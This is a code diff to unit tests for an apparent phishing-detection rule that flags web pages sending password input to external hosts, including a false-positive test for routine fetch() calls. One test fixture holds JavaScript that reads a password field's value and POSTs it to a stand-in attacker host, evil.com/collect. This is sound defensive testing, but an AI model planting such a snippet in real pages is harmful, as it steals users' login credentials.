@@ -87,19 +87,35 @@ class TestExternalFormRule:
         soup = parse_html(html)
         result = self.rule.evaluate(html, soup)
         assert result.triggered is True
-        assert len(result.signals["js_exfil_patterns"]) > 0
+        assert len(result.signals["strong_exfil_patterns"]) > 0
 
-    def test_js_fetch_exfil_triggers(self):
-        """Password + fetch() to external URL = credential exfiltration."""
+    def test_js_fetch_with_cred_access_triggers(self):
+        """Password + fetch() reading .value to external URL = exfiltration."""
         html = """<html><body>
-        <input type="password" name="pw">
+        <input type="password" id="pw">
         <script>
-        fetch("https://evil.com/collect", {method: "POST", body: data});
+        var pw = document.getElementById("pw").value;
+        fetch("https://evil.com/collect", {method: "POST", body: pw});
         </script>
         </body></html>"""
         soup = parse_html(html)
         result = self.rule.evaluate(html, soup)
         assert result.triggered is True
+        assert result.signals["fetch_with_creds"] is True
+
+    def test_js_fetch_without_cred_access_does_not_trigger(self):
+        """Password + fetch() without .value/FormData = NOT exfiltration.
+        This is the key false-positive fix: modern apps use fetch() for
+        routine API calls alongside login forms."""
+        html = """<html><body>
+        <input type="password" name="pw">
+        <script>
+        fetch("https://api.example.com/config").then(r => r.json());
+        </script>
+        </body></html>"""
+        soup = parse_html(html)
+        result = self.rule.evaluate(html, soup)
+        assert result.triggered is False
 
     def test_password_with_no_exfil_does_not_trigger(self):
         """Password field alone without external communication is not enough."""
